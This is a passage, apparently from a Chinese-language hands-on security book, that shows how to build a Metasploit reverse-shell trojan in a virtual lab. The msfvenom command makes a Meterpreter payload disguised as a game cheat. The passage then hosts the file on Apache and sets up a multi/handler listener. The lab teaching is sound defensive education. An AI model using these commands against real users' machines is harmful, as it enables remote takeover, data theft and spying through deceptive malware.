

在本章中，你将在 Kali 虚拟机上安全地创建一个病毒，并通过虚拟网络感染你的 Windows 虚拟机。然后，你将从 Kali 工作站控制 Windows 虚拟机，窃取数据、按键、摄像头视频等——就像攻击者所做的那样。你将负责任地执行这些操作，以确保恶意软件不会逃出你的虚拟环境。在此过程中，你将学习如何保护自己免受互联网上大多数恶意软件的侵害。

要执行我们的攻击，我们将使用 Kali 最著名的工具之一，Metasploit。Metasploit 框架是由计算机安全公司 Rapid7 维护的开源渗透测试工具包。之所以称其为框架，是因为它是一个用于开发、测试和执行漏洞利用的完整软件平台。`exploit` 是一种旨在利用计算机系统中漏洞的攻击。

Metasploit 被称为黑客的瑞士军刀，因为它内置了许多有用的工具。事实上，Metasploit 包含了高达 2,000 个漏洞利用，而且还在不断增加，包括针对 Windows、macOS、Linux、Microsoft Office、Adobe 产品、大多数浏览器、iOS、Android 等的漏洞利用。

## 构建你自己的病毒

我们将首先在 Kali 虚拟机上构建恶意软件，以通过第 3 章中创建的 PublicNAT 网络控制你的 Windows 虚拟机。具体来说，我们将创建一个 `trojan`，这是一种看起来无害但可以让攻击者控制你的计算机的恶意软件。木马有时被称为 `remote access trojans` `(RATs)`，因为它们允许攻击者通过互联网从世界任何地方远程控制目标计算机——无需物理访问。

木马通常伪装成人们可能想下载并运行的文件，例如最新热门歌曲或电影的盗版副本，或者是流行视频游戏的作弊程序。作为示例，我们将把我们的木马命名为 `Fortnite_cheat_mode.exe`。登录到你的 Kali 虚拟机，让我们来创建一些恶意软件！你可能会惊讶于它是多么容易。

1.  在你的 Kali 虚拟机中，点击左上角的 Kali 图标，然后进入 `08 - Exploitation Tools`▶`Metasploit Framework`。如果要求输入 sudo 密码，请输入 `kali`。Metasploit 框架控制台（`msfconsole`）将启动，通常顶部会有一段有趣的 ASCII 文本艺术，如 [Figure 6-1](#c06.xhtml#figure6-1) 所示。

2.  你应该会看到一个标记为 `msf6 >` 的命令提示符，即“Metasploit 框架，版本 6”的缩写。输入 `ip addr` 以检查你的 Kali 虚拟机的 IP 地址，并确保它已连接到 PublicNAT 网络：

    ```
    msf6 > ip addr
    ```

    ![Figure 6-1: Startup information for the Metasploit Framework console, with the Metasploit msf6 > command prompt at the bottom left](image_fi/502000c06/f06001.png)

    Figure 6-1: Startup information for the Metasploit Framework console, with the Metasploit `msf6 >` command prompt at the bottom left

3.  在 `eth0:` 部分下查找以 `inet` 开头并后跟 IP 地址的行：

    ```
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 08:00:27:23:ff:90 brd ff:ff:ff:ff:ff:ff inet 10.0.9.x/24 brd 10.0.9.255 scope global noprefixroute eth0 1
    ```

    只要地址以 `10.0.9` 开头，你就处于在第 3 章中创建的 PublicNAT 网络上，可以开始了。请记下 IP 地址；你需要在几个命令中输入它。如果你没有看到 `10.0.9.x` 作为你的 IP 地址，请回到第 3 章，第 26 页，创建 PublicNAT 网络，或第 27 页，将你的 Kali 虚拟机正确连接到它。

4.  输入以下两行，将 IP 地址中的 `x` 替换为你刚刚查找的数字：

    ```
    msf6 > msfvenom  -p  windows/meterpreter/reverse_tcp  \ > LHOST=10.0.9.x  -f  exe  -o  ~/Desktop/Fortnite_cheat_mode.exe
    ```

5.  你现在应该在桌面上看到一个名为 `Fortnite_cheat_mode.exe` 的文件，如 [Figure 6-2](#c06.xhtml#figure6-2) 所示。如果看不到该文件，请打开文件资源管理器并前往 `/home/kali/Desktop/` 找到它。

    ![Figure 6-2: The msfvenom tool creates a trojan named Fortnite_cheat_mode.exe and places it on the desktop (lower-left).](image_fi/502000c06/f06002.png)

    Figure 6-2: The `msfvenom` tool creates a trojan named `Fortnite_cheat_mode.exe` and places it on the desktop (lower-left).

你现在已经创建了你的第一个木马——干得漂亮！只需在第 4 步中在 `msf6 >` 命令提示符下输入的两行命令即可。实际上，这只是一条长命令，但第一行末尾的反斜杠（`\`）让我们可以将命令延续到第二行。

那么该命令实际上做了什么？它告诉 Metasploit 的 `msfvenom` 工具创建一个包含 Meterpreter shell 的恶意软件，这是一个将允许我们从 Kali 对 Windows 虚拟机进行命令行（shell）控制的接口。我们通过输入 `LHOST=` 后跟 Kali 虚拟机的 IP 地址，告诉 Meterpreter shell 在哪里接收命令。`-f` `exe` 选项告诉 `msfvenom` 输出格式（`-f`）应为 Windows 可执行文件（`exe`）程序文件。`-o` 选项告诉 `msfvenom` 要输出的文件的名称和位置：一个名为 `Fortnite_cheat_mode.exe` 并保存到桌面（`~/Desktop/`）的文件。

### 共享恶意软件

现在我们有了一个木马 Windows 可执行文件，需要将其放入你的 Windows 虚拟机中。通常，攻击者会尝试通过电子邮件发送木马，但许多电子邮件程序会扫描附件中的恶意软件，而且你也不想通过个人电子邮件账户发送木马。相反，我们将创建一个共享文件夹，Windows 用户可以通过他们的网络浏览器访问它。

1.  在 msfconsole 窗口中输入此命令，在大多数 Linux 计算机上共享网络文件夹的默认位置创建一个名为 `share` 的文件夹：

    ```
    msf6 > sudo mkdir /var/www/html/share
    ```

2.  将木马复制到新文件夹中：

    ```
    msf6 > sudo cp ~/Desktop/Fortnite_cheat_mode.exe /var/www/html/share
    ```

3.  启动 Apache Web 服务器应用程序，以便文件夹可以通过网络访问：

    ```
    msf6 > sudo service apache2 start
    ```

4.  要确认木马现在可以供下载，请打开 Kali 虚拟机中的网络浏览器，然后访问 `http://<10.0.9.x>/share`，将 `<10.0.9.x>` 替换为你的 Kali 虚拟机的 IP 地址。你将看到一个类似 [Figure 6-3](#c06.xhtml#figure6-3) 所示的网页。

    ![Figure 6-3: Thanks to Kali’s Apache web server, our trojan malware is now available on the (virtual) web!](image_fi/502000c06/f06003.png)

    Figure 6-3: Thanks to Kali’s Apache web server, our trojan malware is now available on the (virtual) web!

### 监听木马“回家”

我们现在需要准备 Metasploit 以接收来自受感染 Windows 机器的传入连接（我们有时称之为 `phoning home`）。传入连接将允许我们发送恶意命令来远程控制机器。通常，攻击者会向数千名潜在受害者发送病毒电子邮件附件，等待看哪些人打开附件并被感染。在我们的案例中，我们将只感染一台 Windows 虚拟机。但是，通过遵循这些步骤，我们可以同样轻松地接收用于控制多台受感染计算机的连接。

1.  在 `msf6 >` 提示符下输入此命令，告诉 Metasploit 处理或接受来自受感染计算机的多个传入连接：

    ```
    msf6 > use exploit/multi/handler
    ```

    msfconsole 提示符将更改，以告知我们 `multi/handler` 漏洞利用已激活。

2.  现在告诉 Metasploit，木马的 `payload`——即我们交付的恶意程序——是一个 Meterpreter shell：

    ```
    msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
    ```

    msfconsole 将响应 `PAYLOAD => windows/meterpreter/reverse_tcp`，以告知我们 Meterpreter payload 已被选中。

